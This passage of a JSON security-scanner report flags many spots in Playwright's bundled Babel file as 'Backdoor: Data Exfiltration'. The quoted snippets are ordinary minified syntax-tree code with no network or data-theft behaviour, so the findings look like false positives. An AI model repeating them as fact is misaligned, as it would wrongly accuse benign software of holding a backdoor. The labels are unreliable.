                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 15509,
                  "endLine": 66,
                  "endColumn": 15514,
                  "snippet": {
                    "text": ".resolve(e,t);return this.find(s=>s.node===n.node)?void 0:n}}else{if(this.isTypeCastExpression())return this.get(\"expression\").resolve(e,t);if(e&&this.isMemberExpression()){let r=this.toComputedKey();if(!fle(r))return;let n=r.value,s=this.get(\"object\").resolve(e,t);if(s.isObjectExpression()){let i=s.get(\"properties\");for(let a of i){if(!a.isProperty())continue;let o=a.get(\"key\"),l=a.isnt(\"computed\")&&o.isIdentifier({name:n});if(l=l||o.isLiteral({value:n}),l)return a.get(\"value\").resolve(e,t)}}else if(s.isArrayExpression()&&!isNaN(+n)){let a=s.get(\"elements\")[n];if(a)return a.resolve(e,t)}}}}functio",
                    "rendered": {
                      "text": ".resolve(e,t);return this.find(s=>s.node===n.node)?void 0:n}}else{if(this.isTypeCastExpression())return this.get(\"expression\").resolve(e,t);if(e&&this.isMemberExpression()){let r=this.toComputedKey();if(!fle(r))return;let n=r.value,s=this.get(\"object\").resolve(e,t);if(s.isObjectExpression()){let i=s.get(\"properties\");for(let a of i){if(!a.isProperty())continue;let o=a.get(\"key\"),l=a.isnt(\"computed\")&&o.isIdentifier({name:n});if(l=l||o.isLiteral({value:n}),l)return a.get(\"value\").resolve(e,t)}}else if(s.isArrayExpression()&&!isNaN(+n)){let a=s.get(\"elements\")[n];if(a)return a.resolve(e,t)}}}}functio",
                      "markdown": "`.resolve(e,t);return this.find(s=>s.node===n.node)?void 0:n}}else{if(this.isTypeCastExpression())return this.get(\"expression\").resolve(e,t);if(e&&this.isMemberExpression()){let r=this.toComputedKey();if(!fle(r))return;let n=r.value,s=this.get(\"object\").resolve(e,t);if(s.isObjectExpression()){let i=s.get(\"properties\");for(let a of i){if(!a.isProperty())continue;let o=a.get(\"key\"),l=a.isnt(\"computed\")&&o.isIdentifier({name:n});if(l=l||o.isLiteral({value:n}),l)return a.get(\"value\").resolve(e,t)}}else if(s.isArrayExpression()&&!isNaN(+n)){let a=s.get(\"elements\")[n];if(a)return a.resolve(e,t)}}}}functio`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 15447,
                  "endLine": 66,
                  "endColumn": 15452,
                  "snippet": {
                    "text": "stant||r.kind===\"module\")return;if(r.path!==this){let n=r.path.resolve(e,t);return this.find(s=>s.node===n.node)?void 0:n}}else{if(this.isTypeCastExpression())return this.get(\"expression\").resolve(e,t);if(e&&this.isMemberExpression()){let r=this.toComputedKey();if(!fle(r))return;let n=r.value,s=this.get(\"object\").resolve(e,t);if(s.isObjectExpression()){let i=s.get(\"properties\");for(let a of i){if(!a.isProperty())continue;let o=a.get(\"key\"),l=a.isnt(\"computed\")&&o.isIdentifier({name:n});if(l=l||o.isLiteral({value:n}),l)return a.get(\"value\").resolve(e,t)}}else if(s.isArrayExpression()&&!isNaN(+n)){le",
                    "rendered": {
                      "text": "stant||r.kind===\"module\")return;if(r.path!==this){let n=r.path.resolve(e,t);return this.find(s=>s.node===n.node)?void 0:n}}else{if(this.isTypeCastExpression())return this.get(\"expression\").resolve(e,t);if(e&&this.isMemberExpression()){let r=this.toComputedKey();if(!fle(r))return;let n=r.value,s=this.get(\"object\").resolve(e,t);if(s.isObjectExpression()){let i=s.get(\"properties\");for(let a of i){if(!a.isProperty())continue;let o=a.get(\"key\"),l=a.isnt(\"computed\")&&o.isIdentifier({name:n});if(l=l||o.isLiteral({value:n}),l)return a.get(\"value\").resolve(e,t)}}else if(s.isArrayExpression()&&!isNaN(+n)){le",
                      "markdown": "`stant||r.kind===\"module\")return;if(r.path!==this){let n=r.path.resolve(e,t);return this.find(s=>s.node===n.node)?void 0:n}}else{if(this.isTypeCastExpression())return this.get(\"expression\").resolve(e,t);if(e&&this.isMemberExpression()){let r=this.toComputedKey();if(!fle(r))return;let n=r.value,s=this.get(\"object\").resolve(e,t);if(s.isObjectExpression()){let i=s.get(\"properties\");for(let a of i){if(!a.isProperty())continue;let o=a.get(\"key\"),l=a.isnt(\"computed\")&&o.isIdentifier({name:n});if(l=l||o.isLiteral({value:n}),l)return a.get(\"value\").resolve(e,t)}}else if(s.isArrayExpression()&&!isNaN(+n)){le`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 15317,
                  "endLine": 66,
                  "endColumn": 15322,
                  "snippet": {
                    "text": "urn this.get(\"init\").resolve(e,t)}else if(this.isReferencedIdentifier()){let r=this.scope.getBinding(this.node.name);if(!r||!r.constant||r.kind===\"module\")return;if(r.path!==this){let n=r.path.resolve(e,t);return this.find(s=>s.node===n.node)?void 0:n}}else{if(this.isTypeCastExpression())return this.get(\"expression\").resolve(e,t);if(e&&this.isMemberExpression()){let r=this.toComputedKey();if(!fle(r))return;let n=r.value,s=this.get(\"object\").resolve(e,t);if(s.isObjectExpression()){let i=s.get(\"properties\");for(let a of i){if(!a.isProperty())continue;let o=a.get(\"key\"),l=a.isnt(\"computed\")&&o.isIdent",
                    "rendered": {
                      "text": "urn this.get(\"init\").resolve(e,t)}else if(this.isReferencedIdentifier()){let r=this.scope.getBinding(this.node.name);if(!r||!r.constant||r.kind===\"module\")return;if(r.path!==this){let n=r.path.resolve(e,t);return this.find(s=>s.node===n.node)?void 0:n}}else{if(this.isTypeCastExpression())return this.get(\"expression\").resolve(e,t);if(e&&this.isMemberExpression()){let r=this.toComputedKey();if(!fle(r))return;let n=r.value,s=this.get(\"object\").resolve(e,t);if(s.isObjectExpression()){let i=s.get(\"properties\");for(let a of i){if(!a.isProperty())continue;let o=a.get(\"key\"),l=a.isnt(\"computed\")&&o.isIdent",
                      "markdown": "`urn this.get(\"init\").resolve(e,t)}else if(this.isReferencedIdentifier()){let r=this.scope.getBinding(this.node.name);if(!r||!r.constant||r.kind===\"module\")return;if(r.path!==this){let n=r.path.resolve(e,t);return this.find(s=>s.node===n.node)?void 0:n}}else{if(this.isTypeCastExpression())return this.get(\"expression\").resolve(e,t);if(e&&this.isMemberExpression()){let r=this.toComputedKey();if(!fle(r))return;let n=r.value,s=this.get(\"object\").resolve(e,t);if(s.isObjectExpression()){let i=s.get(\"properties\");for(let a of i){if(!a.isProperty())continue;let o=a.get(\"key\"),l=a.isnt(\"computed\")&&o.isIdent`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 15025,
                  "endLine": 66,
                  "endColumn": 15030,
                  "snippet": {
                    "text": "se if(s=n.get(t.node))return s===JA?\"unknown\":s;n.set(t.node,JA);let i=Ile(e,t,r);return n.set(t.node,i),i}function _le(e,t){return this._resolve(e,t)||this}function Nle(e,t){if(!(t&&t.indexOf(this)>=0))if(t=t||[],t.push(this),this.isVariableDeclarator()){if(this.get(\"id\").isIdentifier())return this.get(\"init\").resolve(e,t)}else if(this.isReferencedIdentifier()){let r=this.scope.getBinding(this.node.name);if(!r||!r.constant||r.kind===\"module\")return;if(r.path!==this){let n=r.path.resolve(e,t);return this.find(s=>s.node===n.node)?void 0:n}}else{if(this.isTypeCastExpression())return this.get(\"express",
                    "rendered": {
                      "text": "se if(s=n.get(t.node))return s===JA?\"unknown\":s;n.set(t.node,JA);let i=Ile(e,t,r);return n.set(t.node,i),i}function _le(e,t){return this._resolve(e,t)||this}function Nle(e,t){if(!(t&&t.indexOf(this)>=0))if(t=t||[],t.push(this),this.isVariableDeclarator()){if(this.get(\"id\").isIdentifier())return this.get(\"init\").resolve(e,t)}else if(this.isReferencedIdentifier()){let r=this.scope.getBinding(this.node.name);if(!r||!r.constant||r.kind===\"module\")return;if(r.path!==this){let n=r.path.resolve(e,t);return this.find(s=>s.node===n.node)?void 0:n}}else{if(this.isTypeCastExpression())return this.get(\"express",
                      "markdown": "`se if(s=n.get(t.node))return s===JA?\"unknown\":s;n.set(t.node,JA);let i=Ile(e,t,r);return n.set(t.node,i),i}function _le(e,t){return this._resolve(e,t)||this}function Nle(e,t){if(!(t&&t.indexOf(this)>=0))if(t=t||[],t.push(this),this.isVariableDeclarator()){if(this.get(\"id\").isIdentifier())return this.get(\"init\").resolve(e,t)}else if(this.isReferencedIdentifier()){let r=this.scope.getBinding(this.node.name);if(!r||!r.constant||r.kind===\"module\")return;if(r.path!==this){let n=r.path.resolve(e,t);return this.find(s=>s.node===n.node)?void 0:n}}else{if(this.isTypeCastExpression())return this.get(\"express`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 14988,
                  "endLine": 66,
                  "endColumn": 14993,
                  "snippet": {
                    "text": "e),s;if(!n)r.set(e.node,n=new Map);else if(s=n.get(t.node))return s===JA?\"unknown\":s;n.set(t.node,JA);let i=Ile(e,t,r);return n.set(t.node,i),i}function _le(e,t){return this._resolve(e,t)||this}function Nle(e,t){if(!(t&&t.indexOf(this)>=0))if(t=t||[],t.push(this),this.isVariableDeclarator()){if(this.get(\"id\").isIdentifier())return this.get(\"init\").resolve(e,t)}else if(this.isReferencedIdentifier()){let r=this.scope.getBinding(this.node.name);if(!r||!r.constant||r.kind===\"module\")return;if(r.path!==this){let n=r.path.resolve(e,t);return this.find(s=>s.node===n.node)?void 0:n}}else{if(this.isTypeCast",
                    "rendered": {
                      "text": "e),s;if(!n)r.set(e.node,n=new Map);else if(s=n.get(t.node))return s===JA?\"unknown\":s;n.set(t.node,JA);let i=Ile(e,t,r);return n.set(t.node,i),i}function _le(e,t){return this._resolve(e,t)||this}function Nle(e,t){if(!(t&&t.indexOf(this)>=0))if(t=t||[],t.push(this),this.isVariableDeclarator()){if(this.get(\"id\").isIdentifier())return this.get(\"init\").resolve(e,t)}else if(this.isReferencedIdentifier()){let r=this.scope.getBinding(this.node.name);if(!r||!r.constant||r.kind===\"module\")return;if(r.path!==this){let n=r.path.resolve(e,t);return this.find(s=>s.node===n.node)?void 0:n}}else{if(this.isTypeCast",
                      "markdown": "`e),s;if(!n)r.set(e.node,n=new Map);else if(s=n.get(t.node))return s===JA?\"unknown\":s;n.set(t.node,JA);let i=Ile(e,t,r);return n.set(t.node,i),i}function _le(e,t){return this._resolve(e,t)||this}function Nle(e,t){if(!(t&&t.indexOf(this)>=0))if(t=t||[],t.push(this),this.isVariableDeclarator()){if(this.get(\"id\").isIdentifier())return this.get(\"init\").resolve(e,t)}else if(this.isReferencedIdentifier()){let r=this.scope.getBinding(this.node.name);if(!r||!r.constant||r.kind===\"module\")return;if(r.path!==this){let n=r.path.resolve(e,t);return this.find(s=>s.node===n.node)?void 0:n}}else{if(this.isTypeCast`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 14734,
                  "endLine": 66,
                  "endColumn": 14739,
                  "snippet": {
                    "text": "before\";let s=n.referencePaths,i;for(let a of s){if(!!a.find(u=>u.node===t.node))continue;if(a.key!==\"callee\"||!a.parentPath.isCallExpression())return\"unknown\";let l=o0(e,a,r);if(i&&i!==l)return\"unknown\";i=l}return i}function Ole(e,t,r){let n=r.get(e.node),s;if(!n)r.set(e.node,n=new Map);else if(s=n.get(t.node))return s===JA?\"unknown\":s;n.set(t.node,JA);let i=Ile(e,t,r);return n.set(t.node,i),i}function _le(e,t){return this._resolve(e,t)||this}function Nle(e,t){if(!(t&&t.indexOf(this)>=0))if(t=t||[],t.push(this),this.isVariableDeclarator()){if(this.get(\"id\").isIdentifier())return this.get(\"init\").r",
                    "rendered": {
                      "text": "before\";let s=n.referencePaths,i;for(let a of s){if(!!a.find(u=>u.node===t.node))continue;if(a.key!==\"callee\"||!a.parentPath.isCallExpression())return\"unknown\";let l=o0(e,a,r);if(i&&i!==l)return\"unknown\";i=l}return i}function Ole(e,t,r){let n=r.get(e.node),s;if(!n)r.set(e.node,n=new Map);else if(s=n.get(t.node))return s===JA?\"unknown\":s;n.set(t.node,JA);let i=Ile(e,t,r);return n.set(t.node,i),i}function _le(e,t){return this._resolve(e,t)||this}function Nle(e,t){if(!(t&&t.indexOf(this)>=0))if(t=t||[],t.push(this),this.isVariableDeclarator()){if(this.get(\"id\").isIdentifier())return this.get(\"init\").r",
                      "markdown": "`before\";let s=n.referencePaths,i;for(let a of s){if(!!a.find(u=>u.node===t.node))continue;if(a.key!==\"callee\"||!a.parentPath.isCallExpression())return\"unknown\";let l=o0(e,a,r);if(i&&i!==l)return\"unknown\";i=l}return i}function Ole(e,t,r){let n=r.get(e.node),s;if(!n)r.set(e.node,n=new Map);else if(s=n.get(t.node))return s===JA?\"unknown\":s;n.set(t.node,JA);let i=Ile(e,t,r);return n.set(t.node,i),i}function _le(e,t){return this._resolve(e,t)||this}function Nle(e,t){if(!(t&&t.indexOf(this)>=0))if(t=t||[],t.push(this),this.isVariableDeclarator()){if(this.get(\"id\").isIdentifier())return this.get(\"init\").r`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 14678,
                  "endLine": 66,
                  "endColumn": 14683,
                  "snippet": {
                    "text": "cope.getBinding(t.node.id.name);if(!n.references)return\"before\";let s=n.referencePaths,i;for(let a of s){if(!!a.find(u=>u.node===t.node))continue;if(a.key!==\"callee\"||!a.parentPath.isCallExpression())return\"unknown\";let l=o0(e,a,r);if(i&&i!==l)return\"unknown\";i=l}return i}function Ole(e,t,r){let n=r.get(e.node),s;if(!n)r.set(e.node,n=new Map);else if(s=n.get(t.node))return s===JA?\"unknown\":s;n.set(t.node,JA);let i=Ile(e,t,r);return n.set(t.node,i),i}function _le(e,t){return this._resolve(e,t)||this}function Nle(e,t){if(!(t&&t.indexOf(this)>=0))if(t=t||[],t.push(this),this.isVariableDeclarator()){if",
                    "rendered": {
                      "text": "cope.getBinding(t.node.id.name);if(!n.references)return\"before\";let s=n.referencePaths,i;for(let a of s){if(!!a.find(u=>u.node===t.node))continue;if(a.key!==\"callee\"||!a.parentPath.isCallExpression())return\"unknown\";let l=o0(e,a,r);if(i&&i!==l)return\"unknown\";i=l}return i}function Ole(e,t,r){let n=r.get(e.node),s;if(!n)r.set(e.node,n=new Map);else if(s=n.get(t.node))return s===JA?\"unknown\":s;n.set(t.node,JA);let i=Ile(e,t,r);return n.set(t.node,i),i}function _le(e,t){return this._resolve(e,t)||this}function Nle(e,t){if(!(t&&t.indexOf(this)>=0))if(t=t||[],t.push(this),this.isVariableDeclarator()){if",
                      "markdown": "`cope.getBinding(t.node.id.name);if(!n.references)return\"before\";let s=n.referencePaths,i;for(let a of s){if(!!a.find(u=>u.node===t.node))continue;if(a.key!==\"callee\"||!a.parentPath.isCallExpression())return\"unknown\";let l=o0(e,a,r);if(i&&i!==l)return\"unknown\";i=l}return i}function Ole(e,t,r){let n=r.get(e.node),s;if(!n)r.set(e.node,n=new Map);else if(s=n.get(t.node))return s===JA?\"unknown\":s;n.set(t.node,JA);let i=Ile(e,t,r);return n.set(t.node,i),i}function _le(e,t){return this._resolve(e,t)||this}function Nle(e,t){if(!(t&&t.indexOf(this)>=0))if(t=t||[],t.push(this),this.isVariableDeclarator()){if`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 11891,
                  "endLine": 66,
                  "endColumn": 11896,
                  "snippet": {
                    "text": "?!1:ole.includes(this.key)}function Ple(e,t){if(!this.isReferencedIdentifier()){if(this.isJSXMemberExpression()&&this.node.property.name===t||(this.isMemberExpression()||this.isOptionalMemberExpression())&&(this.node.computed?ple(this.node.property,{value:t}):this.node.property.name===t)){let i=this.get(\"object\");return i.isReferencedIdentifier()&&i.referencesImport(e,\"*\")}return!1}let r=this.scope.getBinding(this.node.name);if(!r||r.kind!==\"module\")return!1;let n=r.path,s=n.parentPath;if(!s.isImportDeclaration())return!1;if(s.node.source.value===e){if(!t)return!0}else return!1;return!!(n.isImportD",
                    "rendered": {
                      "text": "?!1:ole.includes(this.key)}function Ple(e,t){if(!this.isReferencedIdentifier()){if(this.isJSXMemberExpression()&&this.node.property.name===t||(this.isMemberExpression()||this.isOptionalMemberExpression())&&(this.node.computed?ple(this.node.property,{value:t}):this.node.property.name===t)){let i=this.get(\"object\");return i.isReferencedIdentifier()&&i.referencesImport(e,\"*\")}return!1}let r=this.scope.getBinding(this.node.name);if(!r||r.kind!==\"module\")return!1;let n=r.path,s=n.parentPath;if(!s.isImportDeclaration())return!1;if(s.node.source.value===e){if(!t)return!0}else return!1;return!!(n.isImportD",
                      "markdown": "`?!1:ole.includes(this.key)}function Ple(e,t){if(!this.isReferencedIdentifier()){if(this.isJSXMemberExpression()&&this.node.property.name===t||(this.isMemberExpression()||this.isOptionalMemberExpression())&&(this.node.computed?ple(this.node.property,{value:t}):this.node.property.name===t)){let i=this.get(\"object\");return i.isReferencedIdentifier()&&i.referencesImport(e,\"*\")}return!1}let r=this.scope.getBinding(this.node.name);if(!r||r.kind!==\"module\")return!1;let n=r.path,s=n.parentPath;if(!s.isImportDeclaration())return!1;if(s.node.source.value===e){if(!t)return!0}else return!1;return!!(n.isImportD`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 9732,
                  "endLine": 66,
                  "endColumn": 9737,
                  "snippet": {
                    "text": "ReferencedIdentifier({name:\"arguments\"}))return;let r=e.scope;do{if(r.hasOwnBinding(\"arguments\")){r.rename(\"arguments\");return}if(r.path.isFunction()&&!r.path.isArrowFunctionExpression())break}while(r=r.parent);t.push(e)},MetaProperty(e,{newTargetPaths:t}){e.get(\"meta\").isIdentifier({name:\"new\"})&&e.get(\"property\").isIdentifier({name:\"target\"})&&t.push(e)}},s0.default]);function ile(e){let t=[],r=[],n=[],s=[],i=[];return e.traverse(sle,{thisPaths:t,argumentsPaths:r,newTargetPaths:n,superProps:s,superCalls:i}),{thisPaths:t,argumentsPaths:r,newTargetPaths:n,superProps:s,superCalls:i}}});var ZA=E(Ft=>",
                    "rendered": {
                      "text": "ReferencedIdentifier({name:\"arguments\"}))return;let r=e.scope;do{if(r.hasOwnBinding(\"arguments\")){r.rename(\"arguments\");return}if(r.path.isFunction()&&!r.path.isArrowFunctionExpression())break}while(r=r.parent);t.push(e)},MetaProperty(e,{newTargetPaths:t}){e.get(\"meta\").isIdentifier({name:\"new\"})&&e.get(\"property\").isIdentifier({name:\"target\"})&&t.push(e)}},s0.default]);function ile(e){let t=[],r=[],n=[],s=[],i=[];return e.traverse(sle,{thisPaths:t,argumentsPaths:r,newTargetPaths:n,superProps:s,superCalls:i}),{thisPaths:t,argumentsPaths:r,newTargetPaths:n,superProps:s,superCalls:i}}});var ZA=E(Ft=>",
                      "markdown": "`ReferencedIdentifier({name:\"arguments\"}))return;let r=e.scope;do{if(r.hasOwnBinding(\"arguments\")){r.rename(\"arguments\");return}if(r.path.isFunction()&&!r.path.isArrowFunctionExpression())break}while(r=r.parent);t.push(e)},MetaProperty(e,{newTargetPaths:t}){e.get(\"meta\").isIdentifier({name:\"new\"})&&e.get(\"property\").isIdentifier({name:\"target\"})&&t.push(e)}},s0.default]);function ile(e){let t=[],r=[],n=[],s=[],i=[];return e.traverse(sle,{thisPaths:t,argumentsPaths:r,newTargetPaths:n,superProps:s,superCalls:i}),{thisPaths:t,argumentsPaths:r,newTargetPaths:n,superProps:s,superCalls:i}}});var ZA=E(Ft=>`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 9690,
                  "endLine": 66,
                  "endColumn": 9695,
                  "snippet": {
                    "text": ",Identifier(e,{argumentsPaths:t}){if(!e.isReferencedIdentifier({name:\"arguments\"}))return;let r=e.scope;do{if(r.hasOwnBinding(\"arguments\")){r.rename(\"arguments\");return}if(r.path.isFunction()&&!r.path.isArrowFunctionExpression())break}while(r=r.parent);t.push(e)},MetaProperty(e,{newTargetPaths:t}){e.get(\"meta\").isIdentifier({name:\"new\"})&&e.get(\"property\").isIdentifier({name:\"target\"})&&t.push(e)}},s0.default]);function ile(e){let t=[],r=[],n=[],s=[],i=[];return e.traverse(sle,{thisPaths:t,argumentsPaths:r,newTargetPaths:n,superProps:s,superCalls:i}),{thisPaths:t,argumentsPaths:r,newTargetPaths:n,s",
                    "rendered": {
                      "text": ",Identifier(e,{argumentsPaths:t}){if(!e.isReferencedIdentifier({name:\"arguments\"}))return;let r=e.scope;do{if(r.hasOwnBinding(\"arguments\")){r.rename(\"arguments\");return}if(r.path.isFunction()&&!r.path.isArrowFunctionExpression())break}while(r=r.parent);t.push(e)},MetaProperty(e,{newTargetPaths:t}){e.get(\"meta\").isIdentifier({name:\"new\"})&&e.get(\"property\").isIdentifier({name:\"target\"})&&t.push(e)}},s0.default]);function ile(e){let t=[],r=[],n=[],s=[],i=[];return e.traverse(sle,{thisPaths:t,argumentsPaths:r,newTargetPaths:n,superProps:s,superCalls:i}),{thisPaths:t,argumentsPaths:r,newTargetPaths:n,s",
                      "markdown": "`,Identifier(e,{argumentsPaths:t}){if(!e.isReferencedIdentifier({name:\"arguments\"}))return;let r=e.scope;do{if(r.hasOwnBinding(\"arguments\")){r.rename(\"arguments\");return}if(r.path.isFunction()&&!r.path.isArrowFunctionExpression())break}while(r=r.parent);t.push(e)},MetaProperty(e,{newTargetPaths:t}){e.get(\"meta\").isIdentifier({name:\"new\"})&&e.get(\"property\").isIdentifier({name:\"target\"})&&t.push(e)}},s0.default]);function ile(e){let t=[],r=[],n=[],s=[],i=[];return e.traverse(sle,{thisPaths:t,argumentsPaths:r,newTargetPaths:n,superProps:s,superCalls:i}),{thisPaths:t,argumentsPaths:r,newTargetPaths:n,s`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 9354,
                  "endLine": 66,
                  "endColumn": 9359,
                  "snippet": {
                    "text": "isPaths:t}){t.push(e)},JSXIdentifier(e,{thisPaths:t}){e.node.name===\"this\"&&(!e.parentPath.isJSXMemberExpression({object:e.node})&&!e.parentPath.isJSXOpeningElement({name:e.node})||t.push(e))},CallExpression(e,{superCalls:t}){e.get(\"callee\").isSuper()&&t.push(e)},MemberExpression(e,{superProps:t}){e.get(\"object\").isSuper()&&t.push(e)},Identifier(e,{argumentsPaths:t}){if(!e.isReferencedIdentifier({name:\"arguments\"}))return;let r=e.scope;do{if(r.hasOwnBinding(\"arguments\")){r.rename(\"arguments\");return}if(r.path.isFunction()&&!r.path.isArrowFunctionExpression())break}while(r=r.parent);t.push(e)},MetaP",
                    "rendered": {
                      "text": "isPaths:t}){t.push(e)},JSXIdentifier(e,{thisPaths:t}){e.node.name===\"this\"&&(!e.parentPath.isJSXMemberExpression({object:e.node})&&!e.parentPath.isJSXOpeningElement({name:e.node})||t.push(e))},CallExpression(e,{superCalls:t}){e.get(\"callee\").isSuper()&&t.push(e)},MemberExpression(e,{superProps:t}){e.get(\"object\").isSuper()&&t.push(e)},Identifier(e,{argumentsPaths:t}){if(!e.isReferencedIdentifier({name:\"arguments\"}))return;let r=e.scope;do{if(r.hasOwnBinding(\"arguments\")){r.rename(\"arguments\");return}if(r.path.isFunction()&&!r.path.isArrowFunctionExpression())break}while(r=r.parent);t.push(e)},MetaP",
                      "markdown": "`isPaths:t}){t.push(e)},JSXIdentifier(e,{thisPaths:t}){e.node.name===\"this\"&&(!e.parentPath.isJSXMemberExpression({object:e.node})&&!e.parentPath.isJSXOpeningElement({name:e.node})||t.push(e))},CallExpression(e,{superCalls:t}){e.get(\"callee\").isSuper()&&t.push(e)},MemberExpression(e,{superProps:t}){e.get(\"object\").isSuper()&&t.push(e)},Identifier(e,{argumentsPaths:t}){if(!e.isReferencedIdentifier({name:\"arguments\"}))return;let r=e.scope;do{if(r.hasOwnBinding(\"arguments\")){r.rename(\"arguments\");return}if(r.path.isFunction()&&!r.path.isArrowFunctionExpression())break}while(r=r.parent);t.push(e)},MetaP`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 9281,
                  "endLine": 66,
                  "endColumn": 9286,
                  "snippet": {
                    "text": "sh({id:i,init:r(s)})}return s}var sle=(0,i0.merge)([{ThisExpression(e,{thisPaths:t}){t.push(e)},JSXIdentifier(e,{thisPaths:t}){e.node.name===\"this\"&&(!e.parentPath.isJSXMemberExpression({object:e.node})&&!e.parentPath.isJSXOpeningElement({name:e.node})||t.push(e))},CallExpression(e,{superCalls:t}){e.get(\"callee\").isSuper()&&t.push(e)},MemberExpression(e,{superProps:t}){e.get(\"object\").isSuper()&&t.push(e)},Identifier(e,{argumentsPaths:t}){if(!e.isReferencedIdentifier({name:\"arguments\"}))return;let r=e.scope;do{if(r.hasOwnBinding(\"arguments\")){r.rename(\"arguments\");return}if(r.path.isFunction()&&!r.",
                    "rendered": {
